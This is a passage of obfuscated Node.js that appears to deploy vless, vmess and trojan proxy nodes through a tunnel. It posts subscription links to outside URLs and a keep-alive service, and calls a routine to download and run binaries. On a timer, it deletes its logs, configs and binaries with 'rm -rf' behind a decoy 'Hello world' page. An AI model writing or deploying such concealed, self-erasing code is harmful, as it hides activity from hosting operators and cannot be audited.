_0x494856=_0x3b4c,_0x2e5141={'v':'2','ps':''+_0xd64ab,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x494856(_0x35b490._0x2eb6cb),'net':'ws','type':_0x494856(_0x35b490._0x5a84d3),'host':_0x12e02b,'path':'/vmess-argo?ed=2560','tls':_0x494856(_0x35b490._0x597263),'sni':_0x12e02b,'alpn':'','fp':_0x494856(0x102)},_0x35dc3f=_0x494856(0x13f)+UUID+'@'+CFIP+':'+CFPORT+_0x494856(0x158)+_0x12e02b+_0x494856(_0x35b490._0x22ff49)+_0x12e02b+'&path=%2Fvless-argo%3Fed%3D2560#'+_0xd64ab+_0x494856(0x174)+Buffer[_0x494856(_0x35b490._0x1f9fd6)](JSON['stringify'](_0x2e5141))[_0x494856(_0x35b490._0x5a7572)](_0x494856(_0x35b490._0x5b7c28))+'\x0a\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x494856(_0x35b490._0x1c29ab)+_0x12e02b+_0x494856(_0x35b490._0x22ff49)+_0x12e02b+_0x494856(0x10e)+_0xd64ab+'\x0a\x20\x20\x20\x20';console[_0x494856(_0x35b490._0x5c7c1a)](Buffer[_0x494856(_0x35b490._0x1f9fd6)](_0x35dc3f)['toString'](_0x494856(_0x35b490._0x5b7c28))),fs[_0x494856(0xe3)](subPath,Buffer[_0x494856(0xd7)](_0x35dc3f)[_0x494856(_0x35b490._0xf9f4a6)](_0x494856(0xe4))),console['log'](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app['get']('/'+SUB_PATH,(_0x8d4745,_0x88ffc)=>{const _0x4bfeee=_0x494856,_0x1b0da2=Buffer[_0x4bfeee(_0x5207a7._0xfdc4ed)](_0x35dc3f)[_0x4bfeee(_0x5207a7._0x244a29)]('base64');_0x88ffc['set']('Content-Type',_0x4bfeee(_0x5207a7._0x32f08d)),_0x88ffc[_0x4bfeee(0x156)](_0x1b0da2);}),_0x4292cf(_0x35dc3f);},0x7d0);});}}async function uploadNodes(){const _0x40873b={_0x415639:0x126,_0x5913c6:0x121,_0x3a0fc8:0xd4,_0xd19b55:0xec,_0x2eb073:0x146,_0x4c759f:0x146,_0x27b5bb:0xf5,_0x4245cc:0xd6,_0x159fd0:0x106,_0xb02221:0x11a,_0x3be258:0x161},_0x1b49f3=_0x966b64;if(UPLOAD_URL&&PROJECT_URL){const _0x5379e2=PROJECT_URL+'/'+SUB_PATH,_0x5e16c5={'subscription':[_0x5379e2]};try{const _0x4deffa=await axios[_0x1b49f3(_0x40873b._0x415639)](UPLOAD_URL+_0x1b49f3(_0x40873b._0x5913c6),_0x5e16c5,{'headers':{'Content-Type':_0x1b49f3(_0x40873b._0x3a0fc8)}});return _0x4deffa&&_0x4deffa[_0x1b49f3(0x16a)]===0xc8?(console[_0x1b49f3(0x11a)](_0x1b49f3(_0x40873b._0xd19b55)),_0x4deffa):null;}catch(_0x1a2ee6){if(_0x1a2ee6[_0x1b49f3(_0x40873b._0x2eb073)]){if(_0x1a2ee6[_0x1b49f3(_0x40873b._0x4c759f)][_0x1b49f3(0x16a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1b49f3(_0x40873b._0x27b5bb)](listPath))return;const _0x1f1448=fs['readFileSync'](listPath,_0x1b49f3(_0x40873b._0x4245cc)),_0x89ec9d=_0x1f1448[_0x1b49f3(0x175)]('\x0a')[_0x1b49f3(0xbd)](_0x17ed3f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1b49f3(0xb6)](_0x17ed3f));if(_0x89ec9d[_0x1b49f3(_0x40873b._0x159fd0)]===0x0)return;const _0x2acdbb=JSON[_0x1b49f3(0x12f)]({'nodes':_0x89ec9d});try{const _0x5144e2=await axios[_0x1b49f3(0x126)](UPLOAD_URL+_0x1b49f3(0x114),_0x2acdbb,{'headers':{'Content-Type':_0x1b49f3(0xd4)}});return _0x5144e2&&_0x5144e2[_0x1b49f3(0x16a)]===0xc8?(console[_0x1b49f3(_0x40873b._0xb02221)](_0x1b49f3(_0x40873b._0x3be258)),_0x5144e2):null;}catch(_0x1fd275){return null;}}else return;}}function cleanFiles(){const _0x48c9a9={_0x5a6d1c:0x133,_0x226201:0xe7};setTimeout(()=>{const _0x12d423={_0x7febcd:0xb3,_0x211c85:0x119,_0x5ec411:0x11a,_0x50f8c6:0xfd},_0x5a4c87=_0x3b4c,_0x98fc44=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x98fc44['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x98fc44[_0x5a4c87(0x140)](phpPath);process[_0x5a4c87(0x173)]===_0x5a4c87(_0x48c9a9._0x5a6d1c)?exec(_0x5a4c87(_0x48c9a9._0x226201)+_0x98fc44[_0x5a4c87(0xc8)]('\x20')+_0x5a4c87(0xe8),_0x30f737=>{const _0x22cc58=_0x5a4c87;console[_0x22cc58(0xb3)](),console['log'](_0x22cc58(0x119)),console[_0x22cc58(0x11a)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x98fc44['join']('\x20')+'\x20>/dev/null\x202>&1',_0x5d7ed3=>{const _0x49403c=_0x5a4c87;console[_0x49403c(_0x12d423._0x7febcd)](),console[_0x49403c(0x11a)](_0x49403c(_0x12d423._0x211c85)),console[_0x49403c(_0x12d423._0x5ec411)](_0x49403c(_0x12d423._0x50f8c6));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x317eb9={_0x3563f7:0x126,_0x31d895:0x11a,_0x357b05:0xbb},_0x364c46=_0x966b64;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x364c46(0x11a)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x53b9fe=await axios[_0x364c46(_0x317eb9._0x3563f7)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x364c46(0xd4)}});return console[_0x364c46(_0x317eb9._0x31d895)](_0x364c46(0x12c)),_0x53b9fe;}catch(_0x28e805){return console[_0x364c46(0xe9)](_0x364c46(_0x317eb9._0x357b05)+_0x28e805['message']),null;}}async function startserver(){const _0x3f059a=_0x966b64;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xc383e3){console['error'](_0x3f059a(0x145),_0xc383e3);}}function _0x3b4c(_0x2603cf,_0xb89589){const _0x25555f=_0x2555();return _0x3b4c=function(_0x3b4cc6,_0x5431eb){_0x3b4cc6=_0x3b4cc6-0xae;let _0x2b6c91=_0x25555f[_0x3b4cc6];return _0x2b6c91;},_0x3b4c(_0x2603cf,_0xb89589);}startserver()[_0x966b64(0x154)](_0x40dadf=>{const _0x2af4e7=_0x966b64;console[_0x2af4e7(0xe9)]('Unhandled\x20error\x20in\x20startserver:',_0x40dadf);}),app[_0x966b64(0x11c)]('/',async function(_0x242aa2,_0x14e8a1){const _0x4c9eb1={_0x495e24:0xc8,_0x83dee0:0xde,_0x42e256:0x136,_0x451238:0x153},_0x6bb998=_0x966b64;try{const _0xf44d95=path[_0x6bb998(_0x4c9eb1._0x495e24)](__dirname,_0x6bb998(0x13e)),_0x24c1fc=await fs[_0x6bb998(_0x4c9eb1._0x83dee0)][_0x6bb998(_0x4c9eb1._0x42e256)](_0xf44d95,_0x6bb998(_0x4c9eb1._0x451238));_0x14e8a1['send'](_0x24c1fc);}catch(_0x436c20){_0x14e8a1['send']('Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!');}}),app[_0x966b64(0xf9)](PORT,()=>console[_0x966b64(0x11a)](_0x966b64(0x141)+PORT+'!'));
